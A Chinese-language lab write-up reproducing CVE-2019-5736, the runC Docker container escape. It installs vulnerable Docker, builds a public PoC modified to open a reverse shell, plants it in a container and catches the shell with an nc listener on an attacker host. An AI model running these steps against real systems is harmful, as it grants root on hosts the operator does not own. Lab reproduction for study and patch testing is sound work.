# cve-2019-5736 docker逃逸漏洞

## 1.概述

2019年2月11日，runC的维护团队报告了一个新发现的漏洞，SUSE Linux GmbH高级软件工程师Aleksa Sarai公布了影响Docker, containerd, Podman, CRI-O等默认运行时容器runc的严重漏洞CVE-2019-5736。

漏洞会对IT运行环境带来威胁，漏洞利用会触发容器逃逸、影响整个容器主机的安全，最终导致运行在该主机上的其他容器被入侵。漏洞影响AWS, Google Cloud等主流云平台。

攻击者可以通过特定的容器镜像或者exec操作可以获取到宿主机的runC执行时的文件句柄并修改掉runc的二进制文件，从而获取到宿主机的root执行权限。

## 2.漏洞原理

**影响版本**：docker version <=18.09.2 RunC version <=1.0-rc6

漏洞点在于runC，RunC是一个容器运行时，最初是作为Docker的一部分开发的，后来作为一个单独的开源工具和库被提取出来。作为“低级别”容器运行时，runC主要由“高级别”容器运行时（例如Docker）用于生成和运行容器，尽管它可以用作独立工具。像Docker这样的“高级别”容器运行时通常会实现镜像创建和管理等功能，并且可以使用runC来处理与运行容器相关的任务：创建容器、将进程附加到现有容器等。在Docker 18.09.2之前的版本中使用了的runc版本小于1.0-rc6，因此允许攻击者重写宿主机上的runc 二进制文件，攻击者可以在宿主机上以root身份执行命令。

## 3.环境安装

攻击机：192.168.32.11

靶机：192.168.32.111

以下安装均在靶机上安装！

### 3.1 卸载已经安装的docker

```bash
sudo rm /var/lib/dpkg/lock-frontend
sudo rm /var/lib/dpkg/lock
sudo rm /var/cache/apt/archives/lock
apt-get remove docker docker-engine docker-ce docker.io
```

### 3.2 更新索引

 ```bash
rm /var/lib/dpkg/lock
rm /var/lib/apt/lists/lock
rm /var/cache/apt/archives/lock
apt-get update

apt-get install -y apt-transport-https ca-certificates curl software-properties-common

apt-get update
 ```

### 3.3 添加dockerGPG密钥并更新索引

```bash
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -

add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu xenial stable"
```

### 3.4 安装docker18.06.1

```bash
 apt-get install docker-ce=18.06.1~ce~3-0~ubuntu
 #启动docker
 systemctl start docker
 #查看docker版本
 docker -v
```

![image-20211126094117487](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211126094117487.png)

## 4.漏洞复现

### 4.1 生成payload

下载脚本

```bash
cd
git clone https://github.com/Frichetten/CVE-2019-5736-PoC.git
ls
```

![image-20211129092608326](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211129092608326.png)

将go脚本中的命令修改为反弹shell

```bash
cd CVE-2019-5736-PoC/
#修改go脚本第16行，设置nc监听地址
vi main.go
```

![image-20211129093346433](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211129093346433.png)

![image-20211129093200685](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211129093200685.png)

### 4.2 安装go

编译payload，需要go环境。安装参考：https://www.jianshu.com/p/c43ebab25484

查看go版本

```bash
go version
```

![image-20211129094007088](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211129094007088.png)

### 4.3 编译生成payload

```bash
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go
```

![image-20211129094130512](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211129094130512.png)

### 4.4 攻击

#### 4.4.1 将payload拷贝到docker容器中

这就是模拟攻击者获取了docker容器权限，在容器中上传payload进行docker逃逸

```bash
#开启一个docker容器 
docker run -it ubuntu /bin/bash
```

![image-20211129095119923](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211129095119923.png)

Ctrl+Shift+t 新开一个终端窗口，拷贝payload到容器内

```bash
cd /root/CVE-2019-5736-PoC/
docker cp main 495e51b5994c:/home
```

查看是否拷贝成功

![image-20211129095417446](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211129095417446.png)

先在攻击机上开启6767端口的监听

```bash
nc -lvp 6767
```

![image-20211129095518653](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211129095518653.png)

然后在容器内执行payload，等待受害者去启动docker容器。

重新打开一个终端，sh进入容器

```bash
docker exec -it 495e51b5994c /bin/sh
```



![image-20211129095934684](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211129095934684.png)

查看攻击机状态

![image-20211129100031296](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211129100031296.png)

靶机启动docker容器时，触发payload,成功反弹shell

![image-20211129100146333](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211129100146333.png)

![image-20211129100339508](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211129100339508.png)







